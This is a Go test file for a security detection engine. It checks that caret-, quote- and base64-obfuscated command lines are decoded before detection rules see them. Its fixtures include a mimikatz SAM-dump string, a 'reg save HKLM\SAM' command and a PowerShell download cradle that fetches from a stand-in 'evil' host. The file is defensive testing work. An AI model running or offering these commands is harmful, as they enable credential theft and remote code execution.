package detection

import (
	"encoding/json"
	"strings"
	"testing"
)

// flatCmdLine returns the command-line value from a detection flat map, checking the
// field-name variants the engine/rules use.
func flatCmdLine(flat map[string]interface{}) string {
	for _, k := range []string{"CommandLine", "commandLine", "command_line"} {
		if s, ok := flat[k].(string); ok && s != "" {
			return s
		}
	}
	return ""
}

// TestEngineFlatMapDeobfuscation verifies the detection server's event path
// (EventEnvelope.FlatMap → normalizeCommandLine, as wired in Engine.processMessage)
// de-obfuscates the command line, so the DB Sigma rules, IOC matcher and the
// SequenceEngine kill-chain all see the effective command — symmetric to the API
// pipeline pre-pass (#265 extended to server-detect).
func TestEngineFlatMapDeobfuscation(t *testing.T) {
	cases := []struct {
		name, data, want string
	}{
		{
			name: "caret-obfuscated lsadump on renamed binary",
			data: `{"process":{"command_line":"m.exe \"l^s^a^d^u^m^p^:^:^s^a^m\"","image_path":"C:\\Tools\\m.exe","process_name":"m.exe","action":"create"}}`,
			want: "lsadump::sam",
		},
		{
			name: "quote-obfuscated reg save (kill-chain stage token)",
			data: `{"process":{"command_line":"r\"e\"g save HKLM\\SAM x","process_name":"reg.exe","action":"create"}}`,
			want: "reg save",
		},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			env := &EventEnvelope{AgentID: "a1", Type: "process", Data: json.RawMessage(c.data)}
			flat := env.FlatMap()
			normalizeCommandLine(flat)
			if cl := flatCmdLine(flat); !strings.Contains(cl, c.want) {
				t.Errorf("detection flat map not de-obfuscated: want substring %q, got %q", c.want, cl)
			}
		})
	}
}

// TestEngineFlatMapDecodesEncodedPowerShell verifies the encoded-PowerShell payload is
// decoded into the command line the detection engine forwards, so DB content rules fire
// on the payload rather than only the -enc flag.
func TestEngineFlatMapDecodesEncodedPowerShell(t *testing.T) {
	// base64(UTF-16LE) of: IEX (New-Object Net.WebClient).DownloadString('http://evil/a')
	enc := psEncode(`IEX (New-Object Net.WebClient).DownloadString('http://evil/a')`)
	data := `{"process":{"command_line":"powershell -nop -enc ` + enc + `","process_name":"powershell.exe","action":"create"}}`
	env := &EventEnvelope{AgentID: "a2", Type: "process", Data: json.RawMessage(data)}
	flat := env.FlatMap()
	normalizeCommandLine(flat)
	cl := flatCmdLine(flat)
	if !strings.Contains(cl, "DownloadString") || !strings.Contains(cl, "Net.WebClient") {
		t.Errorf("encoded PowerShell payload not decoded into detection command line: %q", cl)
	}
}
